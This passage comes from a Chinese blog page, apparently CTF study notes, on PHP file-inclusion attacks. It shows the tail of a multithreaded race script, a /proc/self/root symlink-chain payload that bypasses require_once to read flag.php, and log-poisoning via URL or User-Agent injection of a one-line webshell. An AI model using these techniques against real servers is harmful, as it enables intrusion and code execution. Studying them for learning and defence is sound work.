class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="require-once软连接绕过"><a href="#require-once软连接绕过" class="headerlink" title="require_once软连接绕过"></a>require_once软连接绕过</h2><p><code>require_once()</code>函数与<code>require()</code>函数功能类似，但所包含的信息只执行一次,使用这个函数可以避免相同的文件被包含多次,但是如果我们需要利用文件包含漏洞来读取源码时,如果关键文件已经被包含过了,就要想办法绕过<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235#h2-0">贴一个大佬讲解原理</a><br>说实话没怎么看懂……简单来说<br>PHP最新版的小Trick， require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含<br><strong>payload:</strong><code>/proc/self/root</code>这个代表的是根目录<br><code>/proc/self/root/proc/self/root</code>这个代表的还是根目录<br>加上很多很多的软连接,就可以绕过<code>require_once</code>,这时候还在根目录,再加上<code>/var/www/html/flag.php</code><br>许多基于 PHP 的网站都将其文件存储在 &#x2F;var&#x2F;www&#x2F;html 目录下。这是一个常用的位置</p>
+<h2 id="日志注入"><a href="#日志注入" class="headerlink" title="日志注入"></a>日志注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apache服务器日志存放文件位置：/var/log/apache/access.log</span><br><span class="line">nginx服务器日志存放位置：/var/log/nginx/access.log和/var/log/nginx/error.log</span><br></pre></td></tr></table></figure>
+<p>日志包含是属于本地文件包含,如果可以控制参数包含日志文件的话,且服务器有对应漏洞,就会产生一定的回显,可以利用这个进行命令注入(一句话木马或是直接写入命令)<br><strong>apache</strong>会存放我们的url参数在访问时回显，这使得我们可以在<code>url</code>后进行命令的注入。<br><strong>nginx</strong>可以看到回显的是ua报文头，同理，我们可以在<code>ua头</code>进行命令的注入</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/Hacker/" rel="tag"># Hacker</a>
+              <a href="/tags/include%E6%BC%8F%E6%B4%9E/" rel="tag"># include漏洞</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/04/23/%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="prev" title="学习反序列化漏洞">
+      <i class="fa fa-chevron-left"></i> 学习反序列化漏洞
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/05/09/SSTI%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/" rel="next" title="SSTI注入的学习">
+      SSTI注入的学习 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E5%90%84%E7%A7%8D%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">php各种伪协议的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php-x2F-x2F-filter"><span class="nav-number">2.1.</span> <span class="nav-text">php:&#x2F;&#x2F;filter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-x2F-x2F-input-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.2.</span> <span class="nav-text">php:&#x2F;&#x2F;input 伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#file-x2F-x2F-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.3.</span> <span class="nav-text">file:&#x2F;&#x2F; 伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#data-x2F-x2F-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.4.</span> <span class="nav-text">data:&#x2F;&#x2F; 伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zip-x2F-x2F-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.5.</span> <span class="nav-text">zip:&#x2F;&#x2F; 伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar-x2F-x2F-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.6.</span> <span class="nav-text">phar:&#x2F;&#x2F; 伪协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">3.</span> <span class="nav-text">临时文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">4.</span> <span class="nav-text">session文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#require-once%E8%BD%AF%E8%BF%9E%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="nav-number">5.</span> <span class="nav-text">require_once软连接绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5"><span class="nav-number">6.</span> <span class="nav-text">日志注入</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="？？喵！！"
+      src="/images/hearder.jpg">
+  <p class="site-author-name" itemprop="name">？？喵！！</p>
+  <div class="site-description" itemprop="description">瞄一下学过代码，写一个睡喵的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">？？喵！！</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">66k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">3:56</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>-->
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+</html>
+
